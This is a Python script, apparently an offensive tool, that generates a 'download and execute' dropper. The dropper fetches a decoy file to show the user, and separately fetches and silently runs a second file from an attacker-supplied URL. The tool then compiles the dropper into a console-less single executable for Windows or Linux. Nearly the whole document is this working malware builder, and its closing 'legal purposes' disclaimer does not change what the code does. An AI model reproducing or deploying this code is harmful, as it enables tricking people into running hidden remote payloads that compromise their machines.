import requests, subprocess, re, os, tempfile, sys, optparse, argparse
owd = os.getcwd()
WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")
def get_arguments():
		parser = argparse.ArgumentParser(description='Download and Execute Payload Options')
		parser.add_argument("-d", "--download", dest="show_file",help="Direct URL of the file which will be shown to the user", required=True)
		parser.add_argument("-b", "--background", dest="background_file",help="Direct URL of the file which will be run in the background", required=True)
		parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
		parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
		parser.add_argument("-o", "--out", dest="out", help="Output file name (add .py at the end of file)", required=True)
		return parser.parse_args()

def download_file(link):
	get_response = requests.get(link)
	file_name = link.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

arguments = get_arguments()

link_1 = arguments.show_file.split("/")[-1]
link_2 = arguments.background_file.split("/")[-1]


def create_payload(file_name, show_file, background_file):
	os.chdir(owd)
	with open(file_name, "w+") as file:
		file.write('from download import download_file\n')
		file.write ('import requests, subprocess, re, os, tempfile, sys, optparse\n')
		file.write('temp_directory = tempfile.gettempdir()\n')
		file.write('os.chdir(temp_directory)\n')
		file.write ('download_file("' + show_file + '")\n')
		file.write('subprocess.Popen("' + link_1 + '", shell=True)\n')
		file.write('download_file("'+ background_file +'")\n')
		file.write('subprocess.call("' + link_2 + '", shell=True)\n')




create_payload(arguments.out, arguments.show_file, arguments.background_file)

if arguments.windows:
	compile_for_windows(arguments.out)

if arguments.linux:
	compile_for_linux(arguments.out)

print("\n\n[***] Please use this tool for Legla and Valid Purposes\n")
print("Thanks for using this tool :)")


